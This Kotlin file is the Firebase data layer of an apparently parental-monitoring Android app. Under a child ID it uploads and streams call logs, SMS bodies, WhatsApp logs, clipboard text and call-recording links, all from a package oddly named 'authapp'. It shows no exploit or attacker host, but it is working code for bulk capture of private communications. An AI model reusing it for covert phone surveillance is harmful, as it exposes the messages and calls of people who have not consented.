package com.example.authapp.data

import com.example.authapp.config.FirebasePaths
import com.example.authapp.model.ActivityFeedItem
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import com.google.firebase.firestore.Query
import com.google.firebase.firestore.SetOptions

object FirebaseCommunicationsRepository {
    private val database: FirebaseDatabase get() = FirebaseDatabase.getInstance()
    private val firestore: FirebaseFirestore get() = FirebaseFirestore.getInstance()
    private val crashlytics: FirebaseCrashlytics get() = FirebaseCrashlytics.getInstance()

    // Universal Activity Feed Pipeline (Unified Model for All Events)
    fun pushActivityFeedItem(childId: String, item: ActivityFeedItem) =
        FirebaseRepoHelpers.pushChildItem(FirebasePaths.ACTIVITY_FEED, childId, item) { itm, id -> itm.copy(id = id) }

    fun listenToActivityFeed(childId: String, limit: Int = 50, onEvents: (List<ActivityFeedItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList(FirebasePaths.ACTIVITY_FEED, childId, limit = limit, transform = { it.sortedByDescending { ev -> ev.timestamp } }, onData = onEvents)

    fun syncCallLogs(childId: String, callLogs: List<CallLogItem>) =
        FirebaseRepoHelpers.syncChildMap(FirebasePaths.CALL_LOGS, childId, callLogs) { it.id.ifEmpty { "${it.timestamp}_${it.number.takeLast(4)}" } }

    fun listenToCallLogs(childId: String, onLogs: (List<CallLogItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList(FirebasePaths.CALL_LOGS, childId, limit = 50, transform = { it.sortedByDescending { c -> c.timestamp } }, onData = onLogs)

    fun pushNotification(childId: String, item: NotificationItem) =
        FirebaseRepoHelpers.pushChildItem(FirebasePaths.NOTIFICATIONS, childId, item) { itm, id -> itm.copy(id = id) }

    fun listenToNotificationsFirestore(childId: String, limit: Long = 20, onNotifications: (List<NotificationItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("notifications", childId, "timestamp", limit, onNotifications)

    fun listenToNotifications(childId: String, onNotifications: (List<NotificationItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList(FirebasePaths.NOTIFICATIONS, childId, limit = 50, transform = { it.sortedByDescending { n -> n.timestamp } }, onData = onNotifications)

    fun syncSmsLogs(childId: String, smsList: List<SmsItem>) =
        FirebaseRepoHelpers.syncChildMap(FirebasePaths.SMS_LOGS, childId, smsList) { it.id.ifEmpty { "${it.timestamp}_${it.address.takeLast(4)}" } }

    fun listenToSmsLogs(childId: String, onSms: (List<SmsItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList(FirebasePaths.SMS_LOGS, childId, limit = 50, transform = { it.sortedByDescending { s -> s.timestamp } }, onData = onSms)

    fun logSingleCallLog(childId: String, callLog: CallLogItem) {
        val key = if (callLog.id.isNotEmpty()) callLog.id else "${callLog.timestamp}_${callLog.number.takeLast(4)}"
        database.reference.child(FirebasePaths.CALL_LOGS).child(childId).child(key)
            .setValue(callLog.copy(id = key))
            .addOnFailureListener { e -> crashlytics.recordException(e) }
        pushActivityFeedItem(childId, ActivityFeedItem(
            category = "CALL",
            title = callLog.name.ifEmpty { callLog.number },
            subtitle = callLog.number,
            message = if (callLog.durationSeconds > 0) "Duration: ${callLog.durationSeconds}s" else callLog.type,
            badge = callLog.type,
            timestamp = callLog.timestamp
        ))
    }

    fun attachRecordingUrlToLatestCallLog(childId: String, recordingUrl: String) {
        if (childId.isEmpty() || recordingUrl.isEmpty()) return
        database.reference.child(FirebasePaths.CALL_LOGS).child(childId)
            .orderByChild("timestamp")
            .limitToLast(1)
            .addListenerForSingleValueEvent(object : com.google.firebase.database.ValueEventListener {
                override fun onDataChange(snapshot: com.google.firebase.database.DataSnapshot) {
                    val childSnap = snapshot.children.firstOrNull() ?: return
                    childSnap.ref.child("audioRecordingUrl").setValue(recordingUrl)
                }
                override fun onCancelled(error: com.google.firebase.database.DatabaseError) {
                    crashlytics.recordException(error.toException())
                }
            })
    }

    fun saveCallLogToFirestore(childId: String, callLog: CallLogItem) = logSingleCallLog(childId, callLog)

    fun listenToChildCallLogsFirestore(childId: String, limit: Long = 20, onUpdate: (List<CallLogItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("call_logs", childId, "timestamp", limit, onUpdate)

    fun saveSmsLogToFirestore(childId: String, sms: SmsItem) {
        val key = if (sms.id.isNotEmpty()) sms.id else "${sms.timestamp}_${sms.address.takeLast(4)}"
        database.reference.child(FirebasePaths.SMS_LOGS).child(childId).child(key)
            .setValue(sms.copy(id = key))
            .addOnFailureListener { e -> crashlytics.recordException(e) }
        pushActivityFeedItem(childId, ActivityFeedItem(
            category = "SMS",
            title = sms.address,
            subtitle = "SMS",
            message = sms.body,
            badge = sms.type,
            timestamp = sms.timestamp
        ))
    }

    fun listenToChildSmsLogsFirestore(childId: String, limit: Long = 20, onUpdate: (List<SmsItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("sms_logs", childId, "timestamp", limit, onUpdate)

    fun pushWhatsAppLog(childId: String, item: WhatsAppLogItem) =
        FirebaseRepoHelpers.pushChildItem(FirebasePaths.WHATSAPP_LOGS, childId, item) { itm, id -> itm.copy(id = id) }

    fun listenToWhatsAppLogsFirestore(childId: String, limit: Long = 20, onLogs: (List<WhatsAppLogItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("whatsapp_logs", childId, "timestamp", limit, onLogs)

    fun listenToWhatsAppLogs(childId: String, onLogs: (List<WhatsAppLogItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList(FirebasePaths.WHATSAPP_LOGS, childId, limit = 50, transform = { it.sortedByDescending { w -> w.timestamp } }, onData = onLogs)

    fun pushClipboardLog(childId: String, text: String) {
        val trimmed = text.trim()
        if (childId.isEmpty() || trimmed.isEmpty()) return
        FirebaseRepoHelpers.pushChildItem(FirebasePaths.CLIPBOARD_LOGS, childId, ClipboardLogItem(text = trimmed, timestamp = System.currentTimeMillis())) { itm, id -> itm.copy(id = id) }
    }

    fun listenToClipboardLogsFirestore(childId: String, limit: Long = 50, onLogs: (List<ClipboardLogItem>) -> Unit): ListenerRegistration =
        FirebaseRepository.listenFirestoreCollection("clipboard_logs", childId, "timestamp", limit, onLogs)

    fun listenToClipboardLogs(childId: String, onLogs: (List<ClipboardLogItem>) -> Unit): ValueEventListener =
        FirebaseRepository.listenToChildNodeList(FirebasePaths.CLIPBOARD_LOGS, childId, limit = 50, transform = { it.sortedByDescending { c -> c.timestamp } }, onData = onLogs)
}
